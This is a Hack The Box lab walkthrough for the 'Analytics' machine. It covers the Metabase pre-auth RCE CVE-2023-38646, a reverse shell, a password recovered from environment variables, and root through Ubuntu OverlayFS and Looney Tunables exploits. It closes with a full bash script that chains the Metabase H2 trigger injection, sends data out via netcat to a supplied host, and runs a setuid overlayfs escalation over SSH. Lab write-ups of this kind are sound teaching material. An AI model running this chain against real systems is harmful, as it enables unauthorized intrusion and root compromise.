<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/5ff96025-6771-4061-bc31-b9bf85d40558"></p>
<h2 align="center"><a href="https://app.hackthebox.com/machines/556">ANALYTICS</a></h2>
<h3 align="center">Overview</h3>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/0cbc5f23-e79d-4078-8554-4f6829570d85" width="75%"></p>
<p align="center">Easy-leveled machine with a neat RCE as initial foothoold and a good demonstration of how fundamentals will cut you time.<br>I will be showing first the intented way to gain root and then the way I first got it.</p>
<h3 align="center">TL/DR at the end (whole step-by-step resumed in a sentence)<br> + whole machine in a file</h3>




<h2 align="center">Reconaissance/Scanning </h2>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/d16df12f-4f23-46bf-9878-06ba9884435f"></p>
<p align="center">Nmap showed only 2 ports open, SSH and HTTP. Meaning there is a website open. The IP address automatically gets resolved as <code>analytical.htb</code>, but never redirected.<br>We need to add it to our /etc/hosts file, as well as the subdomain.</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/d6f3afde-d138-4c3b-a297-86c11fc4f252"></p>
<p align="center">After spending sometime on the website I quickly noticed that wasn't nothing interesting aside from the "Login" webpage.</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/d9a17dce-756b-4061-a629-4288c7bf6946"></p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/4e0f1e52-e6bd-417d-8cc9-fc0cd5ae8177"></p>
<p align="center">I spent sometime playing with the login form while on burpsuite analyzing each request, after unsucessfully coming up with something I decided down my game to the basics and went to the source-code see if I can find a version to anything.<br>I found this 2nd result, a version, that I assumed it was for this "Metabase".</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/76712065-0d49-4cd5-a437-63b19c618581"></p>
<p align="center">As it turns out, I was right.</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/533efb29-9a64-4f87-aa67-64b658d57a6f"></p>
<h3 align="center">CVE-2023-38646</h3>
<p align="center">This RCE is actually a series of attacks combined(better explained in the <a href="https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646">original</a> blog post), that takes advantage of Metabase's setup-token not being cleared after the initial setup, this setup-token can be used as authentication allowing some commands to be executed directly to the database.
<br>The <strong>expected</strong> behaviour of metabase's setup was as the following:<br><br>
During the setup (registration and configuration post first install) the setup-token is embeded in the page/api in order to serve as verification for the setup process, after the process is over, the setup token gets wiped from this instance.
After the metabase is successfuly setted up, whenever an instance is launched, it verifies if the initial set-up was indeed complete and redirects you to the login page (which, this time, has no setup token).
<br><strong>But</strong>, due to a misconfiguration, the setup-token is not only present after the installation, but it is also accessible to unauthenticated users via:<br><br>
  
1. vieweing the HTML source of index/login and finding it <strong>embbeded to a JSON object</strong><br>
2. viewing <code><strong>/api/session/properties</strong></code> (also accessible without auth)<br>
The misconfiguration was, in short, due to a <a href="https://github.com/metabase/metabase/commit/0526d88f997d0f26304cdbb6313996df463ad13f#diff-44990eafd7da3ac7942a9f232b56ec045c558fdc3c414a2439e42b5668eced32L141">commit</a> in Jan 2022 that removed a critical part of the setup flow, which was the part that cleared the setup-token after the setup. (which also meant versions OLDER than jan 2022 (including 0.46.6) were not exposed because they did not suffer this refactoration).<br><br>

With the setup-token one could call the <code>/api/setup/validate</code> and execute commands via <strong>H2</strong> (an database engine) to the operating system. Possibly opening a reverse shell.
</p>
<h2 align="center">Foothold</h2>
<p align="center">After getting the setup-token, getting setuping our netcat session for a reverse shell we can edit the request as we need.</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/b8281df9-004a-41fa-89a5-6b70d4c01b98"></p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/c4f287ef-bc5c-44aa-8435-94d8b583dbf2"></p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/0f943422-10cf-4a84-bf02-36fcac6b7d62"></p>
<p align="center">It's important to, first, change the setup token, change the base64 command to whatever command you want to execute (in our case, our reverse shell) and the name of the operation (in this case I named "aluchesucks" - I do :( )</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/23b0eece-b8b7-44ae-b668-c331c70a0c12"></p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/dbd70ef9-33f5-47b8-9a88-8a3d87ce452c"></p>

<h2 align="center">User & Priv Esc</h2>
<p align="center">We won't be spending much time on the foothold phase tho, if we follow <a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-/Linux/cheat%20sheet%20Basic%20Linux%20Privilege%20Escalation.txt">basic/fundamentals</a> linux enumeration cheatsheets, we can easily find a password stored on the enviroment variables, using <code>env</code>.<br><strong>Always</strong> do the basic first, if I'm not mistaken, this wouldn't appear on linpeas output.<br> This is the password(<code>USER_PASS=An4lytics_ds20223#</code>) for the user <strong>metalytics</strong>(<code>USER_META=metalytics</code>).</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/2a144256-4208-4bb6-b399-51daed5c2601"></p>
<p align="center">After logging in with SSH and running literally one of the first commands on any linux enum cheatsheet, we already find what potentially could be what will escalate our privilege into rootedom (spoiler: it is).<br> Just a reminder: linpeas <strong>WON'T</strong> show this in any of their suggested CVEs.</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/328099e9-80e8-4801-b812-c252ea79b16f"></p>
<p align="center">We can just copy the original exploit straight from the reddit post and change the <code>id</code> call for a <code>bin/sh</code></p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/a7c6756a-3223-40a1-a33f-d2a4a3867976"></p>
<p align="center">You can read more about the vulnerability <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">here</a>, as of now it is out of my scope of understanding.</p>

<h3 align="center">Priv Esc 2</h3>
<p align="center">I did not originally use this method to achieve root though, coincidentally, in the same week the machine was released, was the week-period the <strong>Looney Tunables (CVE-2023-4911)</strong> vulnerability gained attention.<br>Using <a href="https://github.com/Green-Avocado/CVE-2023-4911">this</a> proof-of-concept, I downloaded the program on my machine, compiled, and sent the executable through netcat to HTB's Analysis.<br><br>I thought you were <strong>supposed</strong> to use this vulnerability! lol.</p>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/df83a9e4-9427-44e7-b6da-9363917f26f6"></p>
<p align="center">I am unaware if this vulnerability still works on this machine though.</p>
<h2 align="center">TL/DR</h2>
<p align="center">Scan, add the IP to your /etc/hosts, as well as the login subdomain (<code>data.analytical.htb</code>), go to the source code and find the version of metabase that is running, search and find the exploit, fetch the setup-token, craft your requisition and payload (and remember to switch the <code>name</code> value!)<br>As the <i>metabase</i> user, type <code>env</code> and get the password from the environment variables, ssh into the user.<br>Type <code>uname -a</code>search for that kernel version's exploit, change the cold on the function call to <code>/bin/sh</code>.<br><br><strong>That's it.</strong></p>
<h2 align="center">oneFiler</h2>
<p align="center">This code is only an automation of the steps an user would do in order to solve this machine, no "cheating" involved. For that same reason, you'll need to do some few things before running it<br><br>You will only need to open an python http/nc session as well as the ip and port for that seesion as arguments in order to receive back the password and proceed.</p>

```bash
#!/bin/bash
lol=$(echo "env | grep -i meta_pass | cut -c 11- | nc $1 $2" | base64 -w 0 | tr -d "=")

setup_token=$(wget http://data.analytical.htb/api/session/properties -O- -q| grep -P -i 'setup-token":"[^"]*","application-colors":\{\},"enable-audit-app\?":false,"anon-tracking-enabled":' -o | awk -F ":" '{print $2}' | awk -F "," '{print $1}' | tr -d '"')
payload="{echo,$lol}|{base64,-d}|{bash,-i}"
curl -sS -o /dev/null -X POST  -H "Content-Type: application/json" -H "Accept: application/json" -d '{

    "token": '\"$setup_token\"',
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {

          "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('\'bash\ -c\ $payload\'')\n$$--=x",
            "advanced-options": false,
            "ssl": true

        },

        "name": "'\'\\$3\''",
        "engine": "h2"
    }
}' http://data.analytical.htb/api/setup/validate

echo -e "type/paste the pass you received in"
read pass


sshpass -p $pass ssh metalytics@analytical.htb "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/python3 -c 'import os;os.setuid(0);os.system(\"cat /home/metalytics/user.txt && cat /root/root.txt\")'; rm -rf l u w m" | awk 'BEGIN{ RS = "" ; FS = "\n" ;}{print "USER:",$1; print "ROOT:", $2}'
```

<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/17a37975-fc5c-4ecf-a8db-1bccc9b2cee2"></p>
<br><br>
<h3 align="center">Well, this has been aluche, thanks for reading. See ya.</h3>
<h2 align="center"><a href="https://evildocument.github.io">@evildocument</h2>
<p align="center"><img src="https://github.com/evildocument/writeups/assets/145527328/4e555769-5b70-42d1-ba7f-de0a3596df40"></p>



